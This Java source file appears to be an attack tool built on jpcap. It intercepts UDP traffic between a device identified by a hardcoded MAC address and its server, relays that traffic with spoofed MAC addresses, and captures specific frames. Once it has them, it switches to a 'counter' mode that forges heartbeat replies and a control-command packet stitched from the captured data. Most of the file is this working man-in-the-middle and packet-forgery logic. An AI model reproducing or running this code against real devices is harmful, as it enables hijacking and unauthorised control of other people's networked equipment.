package Manager.Listenner;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.BlockingQueue;

import com.sun.accessibility.internal.resources.accessibility;
import com.sun.corba.se.impl.ior.ByteBuffer;

import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;
import Model.ConterData;
import Model.Model_a;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetUDP;

public class Counter_cat implements PackageListenner {

	private Packet packet;
	private String hostMAC = "18:fe:34:dc:1e:97"; 
	private String dataType = "UDP";
	private ConterData conterData = new ConterData();
	private int flag=0;
	SetUDP st = new SetUDP();
	List<Packet> sendPackets = new ArrayList<Packet>();
	
	private int[] targetMAP = null;
	private Map<Integer, Packet> targetMap = new HashMap<Integer, Packet>();
	
	
	BlockingQueue<Packet> sendQueue;
	
	{
		
		readProperties();
		
	}
	
	
	/*************************************************
	 * 测试使用的主函数
	 *************************************************/
	public static void main(String[] args){
		
		Counter_cat cat = new Counter_cat();
		byte[] b = cat.conterData.getCounter_data_list().get(0).getData_byte();
		System.out.println(b.length);
		
		
		
		//25 26 27 28
		//cat.addByteByGive(b, 36, 2);
		
	}
	
	
	public Counter_cat(BlockingQueue<Packet> sendQueue){
		
		this.sendQueue = sendQueue;
				
	}
	
	public Counter_cat(){
		
	}

	
	@Override
	public void listenPackage(String  yourMAC,String hostMAC,Packet Packet,String routeMAC,String host_ip) {
		
		
		if(this.hostMAC.equals(hostMAC)){

			// TODO Auto-generated method stub
				if(Packet instanceof UDPPacket){
					
					UDPPacket udpPacket = (UDPPacket)Packet;
					UDPPacket udp = null;
					
					//捕捉数据
					if(flag==0){
						setMap(udpPacket);
					}
					
					   //主机发往服务器的数据
					   if(udpPacket.src_ip.getHostAddress().equals(host_ip)){
							
						   String direction = "toService";
						   
						   //捕捉数据模式
						   if(flag==0){
							   flag0(direction,udpPacket,yourMAC,routeMAC);
						   }
						   
						   //伪造数据模式
						   if(flag == 1){
							   flag1(udpPacket, yourMAC);
						   }
						  
					   }
					   
					   //服务器发往主机的消息
					   else if(udpPacket.dst_ip.getHostAddress().equals(host_ip)){
						   String direction = "toHost";
						   
						   if(flag==0){
								flag0(direction,udpPacket,yourMAC,routeMAC);
						   }
					  }
					 
					   
					   if(sendPackets.size()!= 0){
						   try {
							  
							   for(Packet packet:sendPackets){
								   sendQueue.put(packet);
							   }
							   sendPackets.clear();
							   
						} catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   }
				}
			   
			  }
		
		
	}

		@Override
		public Packet instance() {
			
			return this.packet;
		}
		
		
		public byte[] addByteByGive(byte[] dataSource,int index,int add_value){
			
			
			
			int a = dataSource[index]&0xff;
			
			a+=add_value;
			//System.out.println("增加后字节:"+Integer.toHexString(a));
			
			if(a>256){
				
				String hexString = Integer.toHexString(a-256);
				
				if(Integer.toHexString(a-256).length()<2){
					StringBuilder sb = new StringBuilder();
					sb.append("0").append(Integer.toHexString(a-256));
					hexString = sb.toString();
				}
				byte[] b = hexStringToBytes(hexString);
				dataSource[index] = b[0];
				System.out.println("位置:"+index+" 修改为:"+Integer.toHexString(b[0]&0xff));
				
				addByteByGive(dataSource, index-1, 1);
			}else {
				String hexString = Integer.toHexString(a);
				
				if(Integer.toHexString(a).length()<2){
					StringBuilder sb = new StringBuilder();
					sb.append("0").append(Integer.toHexString(a));
					hexString = sb.toString();
				}
				byte[] b = hexStringToBytes(hexString);
				dataSource[index] = b[0];
				System.out.println("位置:"+index+" 修改为:"+Integer.toHexString(b[0]&0xff));
			}
			
			return dataSource;
		}
		
		
		
		
		/*************************************************
		 * 16进制字符串转化为字节数组
		 *************************************************/
		 public static byte[] hexStringToBytes(String hexString) {
		        if (hexString == null || hexString.equals("")) {
		            return null;
		        }
		        hexString = hexString.toUpperCase();
		        int length = hexString.length() / 2;
		        char[] hexChars = hexString.toCharArray();
		        byte[] d = new byte[length];
		        for (int i = 0; i < length; i++) {
		            int pos = i * 2;
		            d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
		        }
		        return d;
		    }
		 
		 	private static byte charToByte(char c) {
		        return (byte) "0123456789ABCDEF".indexOf(c);
		    }
		
		/*************************************************
		 * end
		 *************************************************/
		
		/*************************************************
		 * 将获取的数据拷贝，反制的时候使用
		 *************************************************/
		public void setMap(Packet packet){
			
				if(targetMap.containsKey(packet.data.length)){
					
					System.out.println("已捕捉到的数据  len："+packet.data.length);
				}
				else {
					for(int i =0;i<this.targetMAP.length;i++){
						if(this.targetMAP[i] == packet.data.length){
							targetMap.put(packet.data.length, packet);
							System.out.println("捕获到目标数据    len："+packet.data.length);
							break;
						}
						
					}
					
				}
			
			//抓取到所有特征数据,需要添加判断条件
			if(flag==0){
				if(targetMap.size()==targetMAP.length){
					//设置flag，停止捕捉特征数据
					flag = 1;
					System.out.println("捕获数据完成，已补货的数据  "+targetMap.size() +"启动反制模式");
				}
			}
			
		}
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		 * 交换两个Byte数组的中指定数据
		 *************************************************/
		public byte[] copydataOTO(byte[] targetdata,int begin_index1,byte[] sourcedata,int begin_index2,int copyLen){
			
			
			for(int i =0;i<copyLen;i++){
				
				targetdata[begin_index1+i] = sourcedata[begin_index2+i];
			}
			
			
			return targetdata;
		}
		/*************************************************
		 * end
		 *************************************************/
		
		/*************************************************
		 * flag0处理函数,flag=0 转发数据
		 *************************************************/	
		public Packet flag0(String direction,UDPPacket udpPacket,String yourMAC,String routeMAC){
			
			UDPPacket udp = null;
			
			if(direction.equals("toService")){
				
				udp = st.fakeudp(udpPacket.src_port, udpPacket.dst_port, 
						   udpPacket.src_ip.getHostAddress(),udpPacket.dst_ip.getHostAddress(),  
						   yourMAC, routeMAC, udpPacket.data);
			}
			
			else if(direction.equals("toHost")){
				udp = st.fakeudp(udpPacket.src_port, udpPacket.dst_port, 
						   udpPacket.src_ip.getHostAddress(),udpPacket.dst_ip.getHostAddress(),  
						   yourMAC, hostMAC, udpPacket.data);
			}
			
			if(udp!=null){
				sendPackets.add(udp);
				System.out.println("转发数据    " +"dst_ip:"+udp.dst_ip+"|  src_ip:"+udp.src_ip+"     len："+udp.data.length);
			}
			
			
			return udp;
			  // sendPackets.add(udp);
		}
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		 * flag1处理函数，当抓取到特定的数据后，停止转发，开始伪造数据
		 *************************************************/
		public void flag1(UDPPacket udpPacket,String yourMAC){
			
			UDPPacket udp = null;
			
			//82(40)---心跳	在不断线的情况下是不变的 
			 if(udpPacket.data.length==40){
				   
				   //回复103（61）,不需要处理
				    udp = st.fakeudp(udpPacket.dst_port, udpPacket.src_port, 
						   udpPacket.dst_ip.getHostAddress(), udpPacket.src_ip.getHostAddress(), 
						   yourMAC, hostMAC, targetMap.get(61).data);
				    if(udp!=null){
						sendPackets.add(udp);
						System.out.println("伪造数据    " +"dst_ip:"+udp.dst_ip+"|  src_ip:"+udp.src_ip+"     len："+udp.data.length);
					}
				    
				    
			   }
			   
			   //84(42)---心跳
			   else if(udpPacket.data.length==42){
				   
				   //回复73(31)，需要处理，提取84帧中的35~38位，39~42需要整体提取
				   //同时伪造60(18)数据发送---控制命令起始
				   
				   byte[] base_data = udpPacket.data;
				   byte[] fake_data = targetMap.get(31).data;
				   
				   
				 /*************************************************
				 * 数据替换
				 *************************************************/
					fake_data = copydataOTO(fake_data, 18, base_data, 34, 4);
					 
					fake_data = copydataOTO(fake_data, 23, base_data, 38, 4);
					
					fake_data = copydataOTO(fake_data, 27, base_data, 38, 4);
				/*************************************************
				 * end
				 *************************************************/
					
					udp = st.fakeudp(udpPacket.dst_port, udpPacket.src_port, 
							   udpPacket.dst_ip.getHostAddress(), udpPacket.src_ip.getHostAddress(), 
							   yourMAC, hostMAC, fake_data); 
					
					if(udp!=null){
						sendPackets.add(udp);
						System.out.println("伪造数据    " +"dst_ip:"+udp.dst_ip+"|  src_ip:"+udp.src_ip+"     len："+udp.data.length);
					}
				
					/*************************************************
					 * 起始数据伪造
					 *************************************************/
					byte fake_byte1[] = new byte[18];
					/*for(int i = 0;i<18;i++){
						
						fake_byte1[i] = fake_data[i];
						
					}*/
					fake_byte1 = copydataOTO(fake_byte1, 0, fake_data, 0, 18);
					fake_byte1[13] = (byte)0x1a;
					
					/*************************************************
					 * end
					 *************************************************/
					udp = st.fakeudp(udpPacket.dst_port, udpPacket.src_port, 
							   udpPacket.dst_ip.getHostAddress(), udpPacket.src_ip.getHostAddress(), 
							   yourMAC, hostMAC, fake_byte1); 
					
					if(udp!=null){
						sendPackets.add(udp);
						System.out.println("伪造数据    " +"dst_ip:"+udp.dst_ip+"|  src_ip:"+udp.src_ip+"     len："+udp.data.length);
					}
					
					
			   }
			   
			   //77(35)长度
			   else if (udpPacket.data.length ==35){
				   
				   //等待主机继续发送88(46)---控制命令
				   udp =null;
				   System.out.println("接收到控制命令起始帧 60（18）的确认帧，继续等待主机发送88(46)数据      len:"+udpPacket.data.length);
			   }
			   
			   //88(46)长度 发送伪造数据
			   else if(udpPacket.data.length == 46){
				   //伪造194（152）数据发送，该数据需要处理
				   byte[] dataSource = udpPacket.data;
				   
				   if(conterData.getCounter_data_list().size()!=0){
					   
					   //从93(31)中提取0~11位上的通用标志byte
					   byte[] ds1_data = targetMap.get(31).data;
					   
					   //获取反制数据模版
					   byte[] base_data = conterData.getCounter_data_list().get(0).getData_byte();  
					   
					   //0~11位
					   base_data = copydataOTO(base_data, 0, ds1_data, 0, 12);
					   //12~17位
					   base_data = copydataOTO(base_data, 12, dataSource, 28, 6);
					   //3位00
					   //21~28位,需要做增加调整*********暂时未设置
					   base_data = copydataOTO(base_data, 21, dataSource, 38, 8);
					   
					   //29~32,33~36分别减1加1
					   base_data = copydataOTO(base_data, 29, dataSource, 34, 4);
					   base_data = copydataOTO(base_data, 33, dataSource, 34, 4);
					   
					   
					   base_data = addByteByGive(base_data, 28, 2);
					   base_data = addByteByGive(base_data, 32, -1);
					   base_data = addByteByGive(base_data, 36, 1);
					   
					   
					   udp = st.fakeudp(udpPacket.dst_port, udpPacket.src_port, 
							   udpPacket.dst_ip.getHostAddress(), udpPacket.src_ip.getHostAddress(), 
							   yourMAC, hostMAC, base_data); 
					   
					   if(udp!=null){
							sendPackets.add(udp);
							System.out.println("伪造数据    " +"dst_ip:"+udp.dst_ip+"|  src_ip:"+udp.src_ip+"     len："+udp.data.length);
							
							//停止反制过程
							flag=2;
						}
				   }
				   
				   
			   }
		}
		/*************************************************
		 * end
		 *************************************************/
		
		
		
	/*************************************************
	 * 读取配置文件prameter.properties
	 *************************************************/
	  public void readProperties(){
		  
		    wireless802_airdump1 w = new wireless802_airdump1();
		  
		  
			Properties prop = new Properties();
			
			InputStream in = Object. class .getResourceAsStream( "/counterProperties_cat.properties" );   
			
			
	        try  {    
	           prop.load(in);    
	           
	           String COUNTER_DATASOURCE =  prop.getProperty( "COUNTER_DATASOURCE" ).trim();
	           
	           
	           int[] INT_INDEX = null;
	           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
	           if(ss1.length != 0){ 
	        	   INT_INDEX = new int[ss1.length];
	        	   for(int i = 0;i<ss1.length;i++){  
		        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_UP= null;
	           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
	           if(!ss2[0].equals("")){ 
	        	   HEART_INDEX_UP = new int[ss2.length];
	        	   for(int i = 0;i<ss2.length;i++){  
	        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_DOWN = null;
	           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
	           if(!ss3[0].equals("")){ 
	        	   HEART_INDEX_DOWN = new int[ss3.length];
	        	   for(int i = 0;i<ss3.length;i++){  
	        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
		           } 
	           }
	           
	           int[] STATUS_INDEX_TOSERVICE = null;
	           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
	           if(!ss4[0].equals("")){ 
	        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
	        	   for(int i = 0;i<ss4.length;i++){  
	        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
		           } 
	           }
	           
	           
	           
	           int[] TARGER_MAP_SOURCE = null;
	           String[] ss5 =  prop.getProperty( "TARGER_MAP_SOURCE" ).trim().split(",");
	           if(!ss5[0].equals("")){ 
	        	   TARGER_MAP_SOURCE = new int[ss5.length];
	        	   for(int i = 0;i<ss5.length;i++){  
	        		   TARGER_MAP_SOURCE[i] = Integer.parseInt(ss5[i]);
		           } 
	        	   
	        	  targetMAP = TARGER_MAP_SOURCE;
	        	  System.out.println("捕获数据目标："+targetMAP.length);
	           }
	           
	           
	           
	         //还需要识别一个正常情况下服务与主机的心跳数据，可以完整的与主机通信
				
				List<Model_a> ls = w.ergodic(COUNTER_DATASOURCE);
				List<Model_a> counter_data_list = w.getFrameByindex(INT_INDEX,ls);
				
				if(counter_data_list.size() != 0){
					System.out.println("分析成功！生成反制数据队列........");
					System.out.println("length:"+counter_data_list.size());
					conterData.setCounter_data_list(counter_data_list);
				}else {
					System.out.println("反制队列获取失败");
				}
				
				if(HEART_INDEX_UP !=null && HEART_INDEX_UP.length != 0 ){
					List<Model_a> counter_heart_list_toService = w.getFrameByindex(HEART_INDEX_UP, ls);	
					if(counter_heart_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toService........");
						System.out.println("length:"+counter_heart_list_toService.size());
						conterData.setCounter_heart_list_toService(counter_heart_list_toService);
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toService未启用");
				}
				
				if(HEART_INDEX_DOWN !=null && HEART_INDEX_DOWN.length != 0 ){
					List<Model_a> counter_heart_list_toHost = w.getFrameByindex(HEART_INDEX_DOWN, ls);	
					if(counter_heart_list_toHost.size() != 0){
						System.out.println("分析成功！生成伪造心跳数据toHost........");
						System.out.println("length:"+counter_heart_list_toHost.size());
						conterData.setCounter_heart_list_toHost(counter_heart_list_toHost);
					}
				}else {
					System.out.println("未启用完整反制模式，心跳数据toHost未启用");
				}
				
				
				if( STATUS_INDEX_TOSERVICE != null && STATUS_INDEX_TOSERVICE.length != 0){
					List<Model_a> fake_status_list_toService = w.getFrameByindex(STATUS_INDEX_TOSERVICE, ls);	
					if(fake_status_list_toService.size() != 0){
						System.out.println("分析成功！生成伪造状态数据toService........");
						System.out.println("length:"+fake_status_list_toService.size());
						conterData.setFake_status_list_toService(fake_status_list_toService);
					}
				}
	           
	       }  catch  (IOException e) {    
	           e.printStackTrace();    
	       }  
	         
	  }
	  /*************************************************
	 * end
	 *************************************************/


	public BlockingQueue<Packet> getSendQueue() {
		return sendQueue;
	}


	public void setSendQueue(BlockingQueue<Packet> sendQueue) {
		this.sendQueue = sendQueue;
	}


	@Override
	public int successFlag() {
		// TODO Auto-generated method stub
		return 0;
	}

}
